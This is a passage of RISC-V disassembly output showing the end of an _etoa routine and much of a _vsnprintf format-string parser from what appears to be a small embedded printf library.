    10004062:	fec42783          	lw	a5,-20(s0)
    10004066:	41f7d79b          	sraiw	a5,a5,0x1f
    1000406a:	fec42703          	lw	a4,-20(s0)
    1000406e:	8f3d                	xor	a4,a4,a5
    10004070:	40f707bb          	subw	a5,a4,a5
    10004074:	2781                	sext.w	a5,a5
    10004076:	863e                	mv	a2,a5
    10004078:	fec42783          	lw	a5,-20(s0)
    1000407c:	01f7d79b          	srliw	a5,a5,0x1f
    10004080:	0ff7f693          	zext.b	a3,a5
    10004084:	fe842783          	lw	a5,-24(s0)
    10004088:	37fd                	addiw	a5,a5,-1
    1000408a:	2781                	sext.w	a5,a5
    1000408c:	4715                	li	a4,5
    1000408e:	e43a                	sd	a4,8(sp)
    10004090:	e03e                	sd	a5,0(sp)
    10004092:	4881                	li	a7,0
    10004094:	4829                	li	a6,10
    10004096:	87b6                	mv	a5,a3
    10004098:	8732                	mv	a4,a2
    1000409a:	f9043683          	ld	a3,-112(s0)
    1000409e:	f9843603          	ld	a2,-104(s0)
    100040a2:	fa043583          	ld	a1,-96(s0)
    100040a6:	fa843503          	ld	a0,-88(s0)
    100040aa:	c1eff0ef          	jal	100034c8 <_ntoa_long>
    100040ae:	f8a43c23          	sd	a0,-104(s0)
    100040b2:	f7c42783          	lw	a5,-132(s0)
    100040b6:	8b89                	andi	a5,a5,2
    100040b8:	2781                	sext.w	a5,a5
    100040ba:	cb9d                	beqz	a5,100040f0 <_etoa+0x4ba>
    100040bc:	a00d                	j	100040de <_etoa+0x4a8>
    100040be:	f9843783          	ld	a5,-104(s0)
    100040c2:	00178713          	addi	a4,a5,1
    100040c6:	f8e43c23          	sd	a4,-104(s0)
    100040ca:	fa843703          	ld	a4,-88(s0)
    100040ce:	f9043683          	ld	a3,-112(s0)
    100040d2:	863e                	mv	a2,a5
    100040d4:	fa043583          	ld	a1,-96(s0)
    100040d8:	02000513          	li	a0,32
    100040dc:	9702                	jalr	a4
    100040de:	f9843703          	ld	a4,-104(s0)
    100040e2:	fc043783          	ld	a5,-64(s0)
    100040e6:	8f1d                	sub	a4,a4,a5
    100040e8:	f8046783          	lwu	a5,-128(s0)
    100040ec:	fcf769e3          	bltu	a4,a5,100040be <_etoa+0x488>
    100040f0:	f9843783          	ld	a5,-104(s0)
    100040f4:	853e                	mv	a0,a5
    100040f6:	60ea                	ld	ra,152(sp)
    100040f8:	644a                	ld	s0,144(sp)
    100040fa:	610d                	addi	sp,sp,160
    100040fc:	8082                	ret

Disassembly of section .text._vsnprintf:

00000000100040fe <_vsnprintf>:
    100040fe:	7135                	addi	sp,sp,-160
    10004100:	ed06                	sd	ra,152(sp)
    10004102:	e922                	sd	s0,144(sp)
    10004104:	1100                	addi	s0,sp,160
    10004106:	f8a43c23          	sd	a0,-104(s0)
    1000410a:	f8b43823          	sd	a1,-112(s0)
    1000410e:	f8c43423          	sd	a2,-120(s0)
    10004112:	f8d43023          	sd	a3,-128(s0)
    10004116:	f6e43c23          	sd	a4,-136(s0)
    1000411a:	fc043c23          	sd	zero,-40(s0)
    1000411e:	f9043783          	ld	a5,-112(s0)
    10004122:	3c079ee3          	bnez	a5,10004cfe <_vsnprintf+0xc00>
    10004126:	fffff797          	auipc	a5,0xfffff
    1000412a:	ea278793          	addi	a5,a5,-350 # 10002fc8 <_out_null>
    1000412e:	f8f43c23          	sd	a5,-104(s0)
    10004132:	3cd0006f          	j	10004cfe <_vsnprintf+0xc00>
    10004136:	f8043783          	ld	a5,-128(s0)
    1000413a:	0007c783          	lbu	a5,0(a5)
    1000413e:	873e                	mv	a4,a5
    10004140:	02500793          	li	a5,37
    10004144:	02f70b63          	beq	a4,a5,1000417a <_vsnprintf+0x7c>
    10004148:	f8043783          	ld	a5,-128(s0)
    1000414c:	0007c503          	lbu	a0,0(a5)
    10004150:	fd843783          	ld	a5,-40(s0)
    10004154:	00178713          	addi	a4,a5,1
    10004158:	fce43c23          	sd	a4,-40(s0)
    1000415c:	f9843703          	ld	a4,-104(s0)
    10004160:	f8843683          	ld	a3,-120(s0)
    10004164:	863e                	mv	a2,a5
    10004166:	f9043583          	ld	a1,-112(s0)
    1000416a:	9702                	jalr	a4
    1000416c:	f8043783          	ld	a5,-128(s0)
    10004170:	0785                	addi	a5,a5,1
    10004172:	f8f43023          	sd	a5,-128(s0)
    10004176:	3890006f          	j	10004cfe <_vsnprintf+0xc00>
    1000417a:	f8043783          	ld	a5,-128(s0)
    1000417e:	0785                	addi	a5,a5,1
    10004180:	f8f43023          	sd	a5,-128(s0)
    10004184:	fe042623          	sw	zero,-20(s0)
    10004188:	f8043783          	ld	a5,-128(s0)
    1000418c:	0007c783          	lbu	a5,0(a5)
    10004190:	2781                	sext.w	a5,a5
    10004192:	fe07869b          	addiw	a3,a5,-32
    10004196:	0006871b          	sext.w	a4,a3
    1000419a:	47c1                	li	a5,16
    1000419c:	0ae7ef63          	bltu	a5,a4,1000425a <_vsnprintf+0x15c>
    100041a0:	080687bb          	zext.w	a5,a3
    100041a4:	00279713          	slli	a4,a5,0x2
    100041a8:	00001797          	auipc	a5,0x1
    100041ac:	79878793          	addi	a5,a5,1944 # 10005940 <__am_mainargs+0x1fb>
    100041b0:	97ba                	add	a5,a5,a4
    100041b2:	439c                	lw	a5,0(a5)
    100041b4:	0007871b          	sext.w	a4,a5
    100041b8:	00001797          	auipc	a5,0x1
    100041bc:	78878793          	addi	a5,a5,1928 # 10005940 <__am_mainargs+0x1fb>
    100041c0:	97ba                	add	a5,a5,a4
    100041c2:	8782                	jr	a5
    100041c4:	fec42783          	lw	a5,-20(s0)
    100041c8:	0017e793          	ori	a5,a5,1
    100041cc:	fef42623          	sw	a5,-20(s0)
    100041d0:	f8043783          	ld	a5,-128(s0)
    100041d4:	0785                	addi	a5,a5,1
    100041d6:	f8f43023          	sd	a5,-128(s0)
    100041da:	4785                	li	a5,1
    100041dc:	fef42023          	sw	a5,-32(s0)
    100041e0:	a041                	j	10004260 <_vsnprintf+0x162>
    100041e2:	fec42783          	lw	a5,-20(s0)
    100041e6:	0027e793          	ori	a5,a5,2
    100041ea:	fef42623          	sw	a5,-20(s0)
    100041ee:	f8043783          	ld	a5,-128(s0)
    100041f2:	0785                	addi	a5,a5,1
    100041f4:	f8f43023          	sd	a5,-128(s0)
    100041f8:	4785                	li	a5,1
    100041fa:	fef42023          	sw	a5,-32(s0)
    100041fe:	a08d                	j	10004260 <_vsnprintf+0x162>
    10004200:	fec42783          	lw	a5,-20(s0)
    10004204:	0047e793          	ori	a5,a5,4
    10004208:	fef42623          	sw	a5,-20(s0)
    1000420c:	f8043783          	ld	a5,-128(s0)
    10004210:	0785                	addi	a5,a5,1
    10004212:	f8f43023          	sd	a5,-128(s0)
    10004216:	4785                	li	a5,1
    10004218:	fef42023          	sw	a5,-32(s0)
    1000421c:	a091                	j	10004260 <_vsnprintf+0x162>
    1000421e:	fec42783          	lw	a5,-20(s0)
    10004222:	0087e793          	ori	a5,a5,8
    10004226:	fef42623          	sw	a5,-20(s0)
    1000422a:	f8043783          	ld	a5,-128(s0)
    1000422e:	0785                	addi	a5,a5,1
    10004230:	f8f43023          	sd	a5,-128(s0)
    10004234:	4785                	li	a5,1
    10004236:	fef42023          	sw	a5,-32(s0)
    1000423a:	a01d                	j	10004260 <_vsnprintf+0x162>
    1000423c:	fec42783          	lw	a5,-20(s0)
    10004240:	0107e793          	ori	a5,a5,16
    10004244:	fef42623          	sw	a5,-20(s0)
    10004248:	f8043783          	ld	a5,-128(s0)
    1000424c:	0785                	addi	a5,a5,1
    1000424e:	f8f43023          	sd	a5,-128(s0)
    10004252:	4785                	li	a5,1
    10004254:	fef42023          	sw	a5,-32(s0)
    10004258:	a021                	j	10004260 <_vsnprintf+0x162>
    1000425a:	fe042023          	sw	zero,-32(s0)
    1000425e:	0001                	nop
    10004260:	fe042783          	lw	a5,-32(s0)
    10004264:	2781                	sext.w	a5,a5
    10004266:	f38d                	bnez	a5,10004188 <_vsnprintf+0x8a>
    10004268:	fe042423          	sw	zero,-24(s0)
    1000426c:	f8043783          	ld	a5,-128(s0)
    10004270:	0007c783          	lbu	a5,0(a5)
    10004274:	853e                	mv	a0,a5
    10004276:	dfbfe0ef          	jal	10003070 <_is_digit>
    1000427a:	87aa                	mv	a5,a0
    1000427c:	cb91                	beqz	a5,10004290 <_vsnprintf+0x192>
    1000427e:	f8040793          	addi	a5,s0,-128
    10004282:	853e                	mv	a0,a5
    10004284:	e2dfe0ef          	jal	100030b0 <_atoi>
    10004288:	87aa                	mv	a5,a0
    1000428a:	fef42423          	sw	a5,-24(s0)
    1000428e:	a8b9                	j	100042ec <_vsnprintf+0x1ee>
    10004290:	f8043783          	ld	a5,-128(s0)
    10004294:	0007c783          	lbu	a5,0(a5)
    10004298:	873e                	mv	a4,a5
    1000429a:	02a00793          	li	a5,42
    1000429e:	04f71763          	bne	a4,a5,100042ec <_vsnprintf+0x1ee>
    100042a2:	f7843783          	ld	a5,-136(s0)
    100042a6:	00878713          	addi	a4,a5,8
    100042aa:	f6e43c23          	sd	a4,-136(s0)
    100042ae:	439c                	lw	a5,0(a5)
    100042b0:	fcf42023          	sw	a5,-64(s0)
    100042b4:	fc042783          	lw	a5,-64(s0)
    100042b8:	2781                	sext.w	a5,a5
    100042ba:	0207d063          	bgez	a5,100042da <_vsnprintf+0x1dc>
    100042be:	fec42783          	lw	a5,-20(s0)
    100042c2:	0027e793          	ori	a5,a5,2
    100042c6:	fef42623          	sw	a5,-20(s0)
    100042ca:	fc042783          	lw	a5,-64(s0)
    100042ce:	40f007bb          	negw	a5,a5
    100042d2:	2781                	sext.w	a5,a5
    100042d4:	fef42423          	sw	a5,-24(s0)
    100042d8:	a029                	j	100042e2 <_vsnprintf+0x1e4>
    100042da:	fc042783          	lw	a5,-64(s0)
    100042de:	fef42423          	sw	a5,-24(s0)
    100042e2:	f8043783          	ld	a5,-128(s0)
    100042e6:	0785                	addi	a5,a5,1
    100042e8:	f8f43023          	sd	a5,-128(s0)
    100042ec:	fe042223          	sw	zero,-28(s0)
    100042f0:	f8043783          	ld	a5,-128(s0)
    100042f4:	0007c783          	lbu	a5,0(a5)
    100042f8:	873e                	mv	a4,a5
    100042fa:	02e00793          	li	a5,46
    100042fe:	06f71d63          	bne	a4,a5,10004378 <_vsnprintf+0x27a>
    10004302:	fec42783          	lw	a5,-20(s0)
    10004306:	4007e793          	ori	a5,a5,1024
    1000430a:	fef42623          	sw	a5,-20(s0)
    1000430e:	f8043783          	ld	a5,-128(s0)
    10004312:	0785                	addi	a5,a5,1
    10004314:	f8f43023          	sd	a5,-128(s0)
    10004318:	f8043783          	ld	a5,-128(s0)
    1000431c:	0007c783          	lbu	a5,0(a5)
    10004320:	853e                	mv	a0,a5
    10004322:	d4ffe0ef          	jal	10003070 <_is_digit>
    10004326:	87aa                	mv	a5,a0
    10004328:	cb91                	beqz	a5,1000433c <_vsnprintf+0x23e>
    1000432a:	f8040793          	addi	a5,s0,-128
    1000432e:	853e                	mv	a0,a5
    10004330:	d81fe0ef          	jal	100030b0 <_atoi>
    10004334:	87aa                	mv	a5,a0
    10004336:	fef42223          	sw	a5,-28(s0)
    1000433a:	a83d                	j	10004378 <_vsnprintf+0x27a>
    1000433c:	f8043783          	ld	a5,-128(s0)
    10004340:	0007c783          	lbu	a5,0(a5)
    10004344:	873e                	mv	a4,a5
    10004346:	02a00793          	li	a5,42
    1000434a:	02f71763          	bne	a4,a5,10004378 <_vsnprintf+0x27a>
    1000434e:	f7843783          	ld	a5,-136(s0)
    10004352:	00878713          	addi	a4,a5,8
    10004356:	f6e43c23          	sd	a4,-136(s0)
    1000435a:	439c                	lw	a5,0(a5)
    1000435c:	faf42e23          	sw	a5,-68(s0)
    10004360:	fbc42783          	lw	a5,-68(s0)
    10004364:	0a07e7b3          	max	a5,a5,zero
    10004368:	2781                	sext.w	a5,a5
    1000436a:	fef42223          	sw	a5,-28(s0)
    1000436e:	f8043783          	ld	a5,-128(s0)
    10004372:	0785                	addi	a5,a5,1
    10004374:	f8f43023          	sd	a5,-128(s0)
    10004378:	f8043783          	ld	a5,-128(s0)
    1000437c:	0007c783          	lbu	a5,0(a5)
    10004380:	2781                	sext.w	a5,a5
    10004382:	f987869b          	addiw	a3,a5,-104
    10004386:	0006871b          	sext.w	a4,a3
    1000438a:	47c9                	li	a5,18
    1000438c:	0ee7e863          	bltu	a5,a4,1000447c <_vsnprintf+0x37e>
    10004390:	080687bb          	zext.w	a5,a3
    10004394:	00279713          	slli	a4,a5,0x2
    10004398:	00001797          	auipc	a5,0x1
    1000439c:	5ec78793          	addi	a5,a5,1516 # 10005984 <__am_mainargs+0x23f>
    100043a0:	97ba                	add	a5,a5,a4
    100043a2:	439c                	lw	a5,0(a5)
    100043a4:	0007871b          	sext.w	a4,a5
    100043a8:	00001797          	auipc	a5,0x1
    100043ac:	5dc78793          	addi	a5,a5,1500 # 10005984 <__am_mainargs+0x23f>
    100043b0:	97ba                	add	a5,a5,a4
    100043b2:	8782                	jr	a5
    100043b4:	fec42783          	lw	a5,-20(s0)
    100043b8:	1007e793          	ori	a5,a5,256
    100043bc:	fef42623          	sw	a5,-20(s0)
    100043c0:	f8043783          	ld	a5,-128(s0)
    100043c4:	0785                	addi	a5,a5,1
    100043c6:	f8f43023          	sd	a5,-128(s0)
    100043ca:	f8043783          	ld	a5,-128(s0)
    100043ce:	0007c783          	lbu	a5,0(a5)
    100043d2:	873e                	mv	a4,a5
    100043d4:	06c00793          	li	a5,108
    100043d8:	0af71463          	bne	a4,a5,10004480 <_vsnprintf+0x382>
    100043dc:	fec42783          	lw	a5,-20(s0)
    100043e0:	2007e793          	ori	a5,a5,512
    100043e4:	fef42623          	sw	a5,-20(s0)
    100043e8:	f8043783          	ld	a5,-128(s0)
    100043ec:	0785                	addi	a5,a5,1
    100043ee:	f8f43023          	sd	a5,-128(s0)
    100043f2:	a079                	j	10004480 <_vsnprintf+0x382>
    100043f4:	fec42783          	lw	a5,-20(s0)
    100043f8:	0807e793          	ori	a5,a5,128
    100043fc:	fef42623          	sw	a5,-20(s0)
    10004400:	f8043783          	ld	a5,-128(s0)
    10004404:	0785                	addi	a5,a5,1
    10004406:	f8f43023          	sd	a5,-128(s0)
    1000440a:	f8043783          	ld	a5,-128(s0)
    1000440e:	0007c783          	lbu	a5,0(a5)
    10004412:	873e                	mv	a4,a5
    10004414:	06800793          	li	a5,104
    10004418:	06f71663          	bne	a4,a5,10004484 <_vsnprintf+0x386>
    1000441c:	fec42783          	lw	a5,-20(s0)
    10004420:	0407e793          	ori	a5,a5,64
    10004424:	fef42623          	sw	a5,-20(s0)
    10004428:	f8043783          	ld	a5,-128(s0)
    1000442c:	0785                	addi	a5,a5,1
    1000442e:	f8f43023          	sd	a5,-128(s0)
    10004432:	a889                	j	10004484 <_vsnprintf+0x386>
    10004434:	fec42783          	lw	a5,-20(s0)
    10004438:	1007e793          	ori	a5,a5,256
    1000443c:	fef42623          	sw	a5,-20(s0)
    10004440:	f8043783          	ld	a5,-128(s0)
    10004444:	0785                	addi	a5,a5,1
    10004446:	f8f43023          	sd	a5,-128(s0)
    1000444a:	a835                	j	10004486 <_vsnprintf+0x388>
    1000444c:	fec42783          	lw	a5,-20(s0)
    10004450:	1007e793          	ori	a5,a5,256
    10004454:	fef42623          	sw	a5,-20(s0)
    10004458:	f8043783          	ld	a5,-128(s0)
    1000445c:	0785                	addi	a5,a5,1
    1000445e:	f8f43023          	sd	a5,-128(s0)
    10004462:	a015                	j	10004486 <_vsnprintf+0x388>
    10004464:	fec42783          	lw	a5,-20(s0)
    10004468:	1007e793          	ori	a5,a5,256
    1000446c:	fef42623          	sw	a5,-20(s0)
    10004470:	f8043783          	ld	a5,-128(s0)
    10004474:	0785                	addi	a5,a5,1
    10004476:	f8f43023          	sd	a5,-128(s0)
    1000447a:	a031                	j	10004486 <_vsnprintf+0x388>
    1000447c:	0001                	nop
    1000447e:	a021                	j	10004486 <_vsnprintf+0x388>
    10004480:	0001                	nop
    10004482:	a011                	j	10004486 <_vsnprintf+0x388>
    10004484:	0001                	nop
    10004486:	f8043783          	ld	a5,-128(s0)
    1000448a:	0007c783          	lbu	a5,0(a5)
    1000448e:	2781                	sext.w	a5,a5
    10004490:	86be                	mv	a3,a5
    10004492:	06700713          	li	a4,103
    10004496:	08d74663          	blt	a4,a3,10004522 <_vsnprintf+0x424>
    1000449a:	86be                	mv	a3,a5
    1000449c:	02500713          	li	a4,37
    100044a0:	04e6d763          	bge	a3,a4,100044ee <_vsnprintf+0x3f0>
    100044a4:	02b0006f          	j	10004cce <_vsnprintf+0xbd0>
    100044a8:	2781                	sext.w	a5,a5
    100044aa:	f977879b          	addiw	a5,a5,-105
    100044ae:	2781                	sext.w	a5,a5
    100044b0:	873e                	mv	a4,a5
    100044b2:	4785                	li	a5,1
    100044b4:	00e797b3          	sll	a5,a5,a4
    100044b8:	6725                	lui	a4,0x9
    100044ba:	04170713          	addi	a4,a4,65 # 9041 <_start-0xfff6fbf>
    100044be:	8f7d                	and	a4,a4,a5
    100044c0:	00e03733          	snez	a4,a4
    100044c4:	0ff77713          	zext.b	a4,a4
    100044c8:	eb25                	bnez	a4,10004538 <_vsnprintf+0x43a>
    100044ca:	0807f713          	andi	a4,a5,128
    100044ce:	00e03733          	snez	a4,a4
    100044d2:	0ff77713          	zext.b	a4,a4
    100044d6:	70071e63          	bnez	a4,10004bf2 <_vsnprintf+0xaf4>
    100044da:	4007f793          	andi	a5,a5,1024
    100044de:	00f037b3          	snez	a5,a5
    100044e2:	0ff7f793          	zext.b	a5,a5
    100044e6:	5c079e63          	bnez	a5,10004ac2 <_vsnprintf+0x9c4>
    100044ea:	7e40006f          	j	10004cce <_vsnprintf+0xbd0>
    100044ee:	fdb7869b          	addiw	a3,a5,-37
    100044f2:	0006871b          	sext.w	a4,a3
    100044f6:	04200793          	li	a5,66
    100044fa:	7ce7ea63          	bltu	a5,a4,10004cce <_vsnprintf+0xbd0>
    100044fe:	080687bb          	zext.w	a5,a3
    10004502:	00279713          	slli	a4,a5,0x2
    10004506:	00001797          	auipc	a5,0x1
    1000450a:	4ca78793          	addi	a5,a5,1226 # 100059d0 <__am_mainargs+0x28b>
    1000450e:	97ba                	add	a5,a5,a4
    10004510:	439c                	lw	a5,0(a5)
    10004512:	0007871b          	sext.w	a4,a5
    10004516:	00001797          	auipc	a5,0x1
    1000451a:	4ba78793          	addi	a5,a5,1210 # 100059d0 <__am_mainargs+0x28b>
    1000451e:	97ba                	add	a5,a5,a4
    10004520:	8782                	jr	a5
    10004522:	86be                	mv	a3,a5
    10004524:	07800713          	li	a4,120
    10004528:	7ad74363          	blt	a4,a3,10004cce <_vsnprintf+0xbd0>
    1000452c:	86be                	mv	a3,a5
    1000452e:	06900713          	li	a4,105
    10004532:	f6e6dbe3          	bge	a3,a4,100044a8 <_vsnprintf+0x3aa>
    10004536:	af61                	j	10004cce <_vsnprintf+0xbd0>
    10004538:	f8043783          	ld	a5,-128(s0)
    1000453c:	0007c783          	lbu	a5,0(a5)
    10004540:	873e                	mv	a4,a5
    10004542:	07800793          	li	a5,120
    10004546:	00f70b63          	beq	a4,a5,1000455c <_vsnprintf+0x45e>
    1000454a:	f8043783          	ld	a5,-128(s0)
    1000454e:	0007c783          	lbu	a5,0(a5)
    10004552:	873e                	mv	a4,a5
    10004554:	05800793          	li	a5,88
    10004558:	00f71663          	bne	a4,a5,10004564 <_vsnprintf+0x466>
    1000455c:	47c1                	li	a5,16
    1000455e:	fcf42a23          	sw	a5,-44(s0)
    10004562:	a099                	j	100045a8 <_vsnprintf+0x4aa>
    10004564:	f8043783          	ld	a5,-128(s0)
    10004568:	0007c783          	lbu	a5,0(a5)
    1000456c:	873e                	mv	a4,a5
    1000456e:	06f00793          	li	a5,111
    10004572:	00f71663          	bne	a4,a5,1000457e <_vsnprintf+0x480>
    10004576:	47a1                	li	a5,8
    10004578:	fcf42a23          	sw	a5,-44(s0)
    1000457c:	a035                	j	100045a8 <_vsnprintf+0x4aa>
    1000457e:	f8043783          	ld	a5,-128(s0)
    10004582:	0007c783          	lbu	a5,0(a5)
    10004586:	873e                	mv	a4,a5
    10004588:	06200793          	li	a5,98
    1000458c:	00f71663          	bne	a4,a5,10004598 <_vsnprintf+0x49a>
    10004590:	4789                	li	a5,2
    10004592:	fcf42a23          	sw	a5,-44(s0)
    10004596:	a809                	j	100045a8 <_vsnprintf+0x4aa>
    10004598:	47a9                	li	a5,10
    1000459a:	fcf42a23          	sw	a5,-44(s0)
    1000459e:	fec42783          	lw	a5,-20(s0)
    100045a2:	9bbd                	andi	a5,a5,-17
    100045a4:	fef42623          	sw	a5,-20(s0)
    100045a8:	f8043783          	ld	a5,-128(s0)
    100045ac:	0007c783          	lbu	a5,0(a5)
    100045b0:	873e                	mv	a4,a5
    100045b2:	05800793          	li	a5,88
    100045b6:	00f71863          	bne	a4,a5,100045c6 <_vsnprintf+0x4c8>
    100045ba:	fec42783          	lw	a5,-20(s0)
    100045be:	0207e793          	ori	a5,a5,32
    100045c2:	fef42623          	sw	a5,-20(s0)
    100045c6:	f8043783          	ld	a5,-128(s0)
    100045ca:	0007c783          	lbu	a5,0(a5)
    100045ce:	873e                	mv	a4,a5
    100045d0:	06900793          	li	a5,105
    100045d4:	02f70163          	beq	a4,a5,100045f6 <_vsnprintf+0x4f8>
    100045d8:	f8043783          	ld	a5,-128(s0)
    100045dc:	0007c783          	lbu	a5,0(a5)
    100045e0:	873e                	mv	a4,a5
    100045e2:	06400793          	li	a5,100
    100045e6:	00f70863          	beq	a4,a5,100045f6 <_vsnprintf+0x4f8>
    100045ea:	fec42783          	lw	a5,-20(s0)
    100045ee:	9bed                	andi	a5,a5,-5
    100045f0:	9bdd                	andi	a5,a5,-9
    100045f2:	fef42623          	sw	a5,-20(s0)
    100045f6:	fec42783          	lw	a5,-20(s0)
    100045fa:	4007f793          	andi	a5,a5,1024
    100045fe:	2781                	sext.w	a5,a5
    10004600:	c791                	beqz	a5,1000460c <_vsnprintf+0x50e>
    10004602:	fec42783          	lw	a5,-20(s0)
    10004606:	9bf9                	andi	a5,a5,-2
    10004608:	fef42623          	sw	a5,-20(s0)
    1000460c:	f8043783          	ld	a5,-128(s0)
    10004610:	0007c783          	lbu	a5,0(a5)
    10004614:	873e                	mv	a4,a5
    10004616:	06900793          	li	a5,105
    1000461a:	00f70b63          	beq	a4,a5,10004630 <_vsnprintf+0x532>
    1000461e:	f8043783          	ld	a5,-128(s0)
    10004622:	0007c783          	lbu	a5,0(a5)
    10004626:	873e                	mv	a4,a5
    10004628:	06400793          	li	a5,100
    1000462c:	18f71963          	bne	a4,a5,100047be <_vsnprintf+0x6c0>
    10004630:	fec42783          	lw	a5,-20(s0)
    10004634:	2007f793          	andi	a5,a5,512
    10004638:	2781                	sext.w	a5,a5
    1000463a:	c3bd                	beqz	a5,100046a0 <_vsnprintf+0x5a2>
    1000463c:	f7843783          	ld	a5,-136(s0)
    10004640:	00878713          	addi	a4,a5,8
    10004644:	f6e43c23          	sd	a4,-136(s0)
    10004648:	639c                	ld	a5,0(a5)
    1000464a:	faf43023          	sd	a5,-96(s0)
    1000464e:	fa043783          	ld	a5,-96(s0)
    10004652:	40f00733          	neg	a4,a5
    10004656:	fa043783          	ld	a5,-96(s0)
    1000465a:	0af767b3          	max	a5,a4,a5
    1000465e:	85be                	mv	a1,a5
    10004660:	fa043783          	ld	a5,-96(s0)
    10004664:	93fd                	srli	a5,a5,0x3f
    10004666:	0ff7f713          	zext.b	a4,a5
    1000466a:	fd446683          	lwu	a3,-44(s0)
    1000466e:	fe442603          	lw	a2,-28(s0)
    10004672:	fec42783          	lw	a5,-20(s0)
    10004676:	e43e                	sd	a5,8(sp)
    10004678:	fe842783          	lw	a5,-24(s0)
    1000467c:	e03e                	sd	a5,0(sp)
    1000467e:	88b2                	mv	a7,a2
    10004680:	8836                	mv	a6,a3
    10004682:	87ba                	mv	a5,a4
    10004684:	872e                	mv	a4,a1
    10004686:	f8843683          	ld	a3,-120(s0)
    1000468a:	fd843603          	ld	a2,-40(s0)
    1000468e:	f9043583          	ld	a1,-112(s0)
    10004692:	f9843503          	ld	a0,-104(s0)
    10004696:	f49fe0ef          	jal	100035de <_ntoa_long_long>
    1000469a:	fca43c23          	sd	a0,-40(s0)
    1000469e:	a4a9                	j	100048e8 <_vsnprintf+0x7ea>
    100046a0:	fec42783          	lw	a5,-20(s0)
    100046a4:	1007f793          	andi	a5,a5,256
    100046a8:	2781                	sext.w	a5,a5
    100046aa:	c3bd                	beqz	a5,10004710 <_vsnprintf+0x612>
    100046ac:	f7843783          	ld	a5,-136(s0)
    100046b0:	00878713          	addi	a4,a5,8
    100046b4:	f6e43c23          	sd	a4,-136(s0)
    100046b8:	639c                	ld	a5,0(a5)
    100046ba:	faf43423          	sd	a5,-88(s0)
    100046be:	fa843783          	ld	a5,-88(s0)
    100046c2:	40f00733          	neg	a4,a5
    100046c6:	fa843783          	ld	a5,-88(s0)
    100046ca:	0af767b3          	max	a5,a4,a5
    100046ce:	85be                	mv	a1,a5
    100046d0:	fa843783          	ld	a5,-88(s0)
    100046d4:	93fd                	srli	a5,a5,0x3f
    100046d6:	0ff7f713          	zext.b	a4,a5
    100046da:	fd446683          	lwu	a3,-44(s0)
    100046de:	fe442603          	lw	a2,-28(s0)
    100046e2:	fec42783          	lw	a5,-20(s0)
    100046e6:	e43e                	sd	a5,8(sp)
    100046e8:	fe842783          	lw	a5,-24(s0)
    100046ec:	e03e                	sd	a5,0(sp)
    100046ee:	88b2                	mv	a7,a2
    100046f0:	8836                	mv	a6,a3
    100046f2:	87ba                	mv	a5,a4
    100046f4:	872e                	mv	a4,a1
    100046f6:	f8843683          	ld	a3,-120(s0)
    100046fa:	fd843603          	ld	a2,-40(s0)
    100046fe:	f9043583          	ld	a1,-112(s0)
    10004702:	f9843503          	ld	a0,-104(s0)
    10004706:	dc3fe0ef          	jal	100034c8 <_ntoa_long>
    1000470a:	fca43c23          	sd	a0,-40(s0)
    1000470e:	aae9                	j	100048e8 <_vsnprintf+0x7ea>
    10004710:	fec42783          	lw	a5,-20(s0)
    10004714:	0407f793          	andi	a5,a5,64
    10004718:	2781                	sext.w	a5,a5
    1000471a:	cf81                	beqz	a5,10004732 <_vsnprintf+0x634>
    1000471c:	f7843783          	ld	a5,-136(s0)
    10004720:	00878713          	addi	a4,a5,8
    10004724:	f6e43c23          	sd	a4,-136(s0)
    10004728:	439c                	lw	a5,0(a5)
    1000472a:	0ff7f793          	zext.b	a5,a5
    1000472e:	2781                	sext.w	a5,a5
    10004730:	a805                	j	10004760 <_vsnprintf+0x662>
    10004732:	fec42783          	lw	a5,-20(s0)
    10004736:	0807f793          	andi	a5,a5,128
    1000473a:	2781                	sext.w	a5,a5
    1000473c:	cb99                	beqz	a5,10004752 <_vsnprintf+0x654>
    1000473e:	f7843783          	ld	a5,-136(s0)
    10004742:	00878713          	addi	a4,a5,8
    10004746:	f6e43c23          	sd	a4,-136(s0)
    1000474a:	439c                	lw	a5,0(a5)
    1000474c:	60579793          	sext.h	a5,a5
    10004750:	a801                	j	10004760 <_vsnprintf+0x662>
    10004752:	f7843783          	ld	a5,-136(s0)
    10004756:	00878713          	addi	a4,a5,8
    1000475a:	f6e43c23          	sd	a4,-136(s0)
    1000475e:	439c                	lw	a5,0(a5)
    10004760:	faf42823          	sw	a5,-80(s0)
    10004764:	fb042783          	lw	a5,-80(s0)
    10004768:	41f7d79b          	sraiw	a5,a5,0x1f
    1000476c:	fb042703          	lw	a4,-80(s0)
    10004770:	8f3d                	xor	a4,a4,a5
    10004772:	40f707bb          	subw	a5,a4,a5
    10004776:	2781                	sext.w	a5,a5
    10004778:	2781                	sext.w	a5,a5
    1000477a:	0807873b          	zext.w	a4,a5
    1000477e:	fb042783          	lw	a5,-80(s0)
    10004782:	01f7d79b          	srliw	a5,a5,0x1f
    10004786:	0ff7f693          	zext.b	a3,a5
    1000478a:	fd446603          	lwu	a2,-44(s0)
    1000478e:	fe442583          	lw	a1,-28(s0)
    10004792:	fec42783          	lw	a5,-20(s0)
    10004796:	e43e                	sd	a5,8(sp)
    10004798:	fe842783          	lw	a5,-24(s0)
    1000479c:	e03e                	sd	a5,0(sp)
    1000479e:	88ae                	mv	a7,a1
    100047a0:	8832                	mv	a6,a2
    100047a2:	87b6                	mv	a5,a3
    100047a4:	f8843683          	ld	a3,-120(s0)
    100047a8:	fd843603          	ld	a2,-40(s0)
    100047ac:	f9043583          	ld	a1,-112(s0)
    100047b0:	f9843503          	ld	a0,-104(s0)
    100047b4:	d15fe0ef          	jal	100034c8 <_ntoa_long>
    100047b8:	fca43c23          	sd	a0,-40(s0)
    100047bc:	a235                	j	100048e8 <_vsnprintf+0x7ea>
    100047be:	fec42783          	lw	a5,-20(s0)
    100047c2:	2007f793          	andi	a5,a5,512
    100047c6:	2781                	sext.w	a5,a5
    100047c8:	c3b1                	beqz	a5,1000480c <_vsnprintf+0x70e>
    100047ca:	f7843783          	ld	a5,-136(s0)
    100047ce:	00878713          	addi	a4,a5,8
    100047d2:	f6e43c23          	sd	a4,-136(s0)
    100047d6:	6398                	ld	a4,0(a5)
    100047d8:	fd446683          	lwu	a3,-44(s0)
    100047dc:	fe442603          	lw	a2,-28(s0)
    100047e0:	fec42783          	lw	a5,-20(s0)
    100047e4:	e43e                	sd	a5,8(sp)
    100047e6:	fe842783          	lw	a5,-24(s0)
    100047ea:	e03e                	sd	a5,0(sp)
    100047ec:	88b2                	mv	a7,a2
    100047ee:	8836                	mv	a6,a3
    100047f0:	4781                	li	a5,0
    100047f2:	f8843683          	ld	a3,-120(s0)
    100047f6:	fd843603          	ld	a2,-40(s0)
